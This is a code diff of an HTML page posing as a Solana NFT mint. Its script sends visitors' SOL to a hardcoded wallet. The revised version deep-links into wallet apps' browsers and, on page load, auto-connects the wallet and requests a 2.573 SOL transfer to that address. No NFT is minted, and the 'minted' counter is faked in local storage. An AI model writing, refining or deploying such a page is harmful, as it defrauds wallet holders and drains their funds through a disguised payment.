@@ -26,13 +26,8 @@
     }
     button:hover{background:#ffed4e;transform:scale(1.04)}
     .status{margin-top:12px;font-size:.95rem;min-height:22px;font-weight:bold}
-    .loader{
-      display:inline-block;width:12px;height:12px;border:2px solid #ffd700;
-      border-radius:50%;border-top-color:transparent;
-      animation:s 1s linear infinite;margin-right:4px;
-    }
+    .loader{display:inline-block;width:12px;height:12px;border:2px solid #ffd700;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:4px;}
     @keyframes s{to{transform:rotate(360deg)}}
-    .wallets{margin-top:30px;font-size:.85rem;color:#777}
   </style>
 </head>
 <body>
@@ -42,98 +37,93 @@
     <p class="price">2.5730 SOL</p>
     <p class="stats">Minted: <span id="minted">0</span> / 10,000</p>
 
-    <button id="chooseWallet">CHOOSE WALLET</button>
+    <button onclick="showWallets()">CHOOSE WALLET</button>
 
-    <!-- Wallet Options -->
-    <div id="walletOptions" style="display:none;">
-      <button onclick="mintWithWallet('phantom')">Phantom</button>
-      <button onclick="mintWithWallet('trust')">Trust Wallet</button>
-      <button onclick="mintWithWallet('metamask')">MetaMask (Solana)</button>
+    <div id="wallets" style="display:none;">
+      <button onclick="openPhantom()">Phantom</button>
+      <button onclick="openTrust()">Trust Wallet</button>
+      <button onclick="openMetamask()">MetaMask</button>
     </div>
 
     <div id="status" class="status"></div>
-    <div class="wallets">Choose your wallet to mint</div>
   </div>
 
-  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
-
   <script>
-    const PRICE_LAMPORTS = 2.5730 * 1e9;
-    // YOUR MAIN WALLET — ALL SOL GOES HERE
+    const PRICE = 2.5730 * 1e9;
     const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
+    let count = localStorage.getItem('softfund') || 0;
+    document.getElementById('minted').textContent = count;
 
-    let mintedCount = localStorage.getItem('softfund_minted') ? parseInt(localStorage.getItem('softfund_minted')) : 0;
-    document.getElementById('minted').textContent = mintedCount;
-
-    const status = document.getElementById("status");
-    const chooseBtn = document.getElementById("chooseWallet");
-    const walletOptions = document.getElementById("walletOptions");
-
-    function setStatus(html, color) {
-      status.innerHTML = html;
-      status.style.color = color;
+    function status(txt, color) {
+      document.getElementById('status').innerHTML = txt;
+      document.getElementById('status').style.color = color;
     }
 
-    // Show wallet choices
-    chooseBtn.onclick = () => {
-      chooseBtn.style.display = 'none';
-      walletOptions.style.display = 'block';
-    };
-
-    // Build unsigned transaction
-    async function buildTx() {
-      const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-      const { blockhash } = await connection.getLatestBlockhash();
-      const tx = new solanaWeb3.Transaction();
-      tx.recentBlockhash = blockhash;
-      tx.add(
-        solanaWeb3.SystemProgram.transfer({
-          fromPubkey: null,
-          toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
-          lamports: PRICE_LAMPORTS,
-        })
-      );
-      return tx.serialize({ requireAllSignatures: false }).toString('base64');
+    function showWallets() {
+      document.querySelector('button').style.display = 'none';
+      document.getElementById('wallets').style.display = 'block';
     }
 
-    // Deep link to wallet
-    async function mintWithWallet(type) {
-      setStatus("Preparing payment... <span class='loader'></span>", "#ffd700");
+    // === PHANTOM: Open IN APP + auto-connect + pay ===
+    function openPhantom() {
+      status("Opening Phantom... <span class='loader'></span>", "#ffd700");
+      const url = "https://phantom.app/ul/browse/" + encodeURIComponent(location.href) + "?ref=" + encodeURIComponent(location.href);
+      location.href = url;
+    }
+
+    // === TRUST: Open page inside Trust browser ===
+    function openTrust() {
+      status("Opening Trust Wallet... <span class='loader'></span>", "#ffd700");
+      location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(location.href);
+    }
+
+    // === METAMASK: Open page inside MetaMask browser ===
+    function openMetamask() {
+      status("Opening MetaMask... <span class='loader'></span>", "#ffd700");
+      location.href = "https://metamask.app.link/dapp/" + location.host + location.pathname;
+    }
+
+    // === AUTO-MINT WHEN PAGE LOADS IN WALLET ===
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        if (window.solana || window.trustwallet || window.ethereum) {
+          mintNow();
+        }
+      }, 1000);
+    });
+
+    async function mintNow() {
+      status("Connecting... <span class='loader'></span>", "#ffd700");
+      let provider = window.solana || window.trustwallet?.Provider?.solana || window.ethereum;
+
+      if (!provider) return status("Wallet not found", "#ff5555");
 
       try {
-        const txBase64 = await buildTx();
-        const currentUrl = window.location.href.split('#')[0]; // Clean URL
-        let deepLink = "";
+        if (!provider.isConnected) await provider.connect();
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const tx = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: provider.publicKey,
+            toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
+            lamports: PRICE,
+          })
+        );
+        const { blockhash } = await connection.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = provider.publicKey;
 
-        if (type === 'phantom') {
-          deepLink = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(currentUrl)}&redirect_link=${encodeURIComponent(currentUrl + '#tx=' + txBase64)}`;
-        } else if (type === 'trust') {
-          deepLink = `https://link.trustwallet.com/open_url?app=trust&url=${encodeURIComponent(currentUrl + '#tx=' + txBase64)}`;
-        } else if (type === 'metamask') {
-          deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}#tx=${txBase64}`;
-        }
+        const signed = await provider.signTransaction(tx);
+        const sig = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(sig);
 
-        window.location.href = deepLink;
-
-        // Simulate success (fake counter)
-        setTimeout(() => {
-          mintedCount++;
-          document.getElementById('minted').textContent = mintedCount;
-          localStorage.setItem('softfund_minted', mintedCount);
-          setStatus("MINTED! Payment sent.", "#00ff9d");
-          setTimeout(() => {
-            setStatus("");
-            chooseBtn.style.display = 'block';
-            walletOptions.style.display = 'none';
-          }, 3000);
-        }, 3000);
-
-      } catch (err) {
-        setStatus("Failed. Try again.", "#ff5555");
-        chooseBtn.style.display = 'block';
-        walletOptions.style.display = 'none';
+        count++; localStorage.setItem('softfund', count);
+        document.getElementById('minted').textContent = count;
+        status(`MINTED! <a href="https://solscan.io/tx/${sig}" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
+      } catch (e) {
+        status("Failed – try again", "#ff5555");
       }
     }
   </script>
+  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
 </body>
 </html>
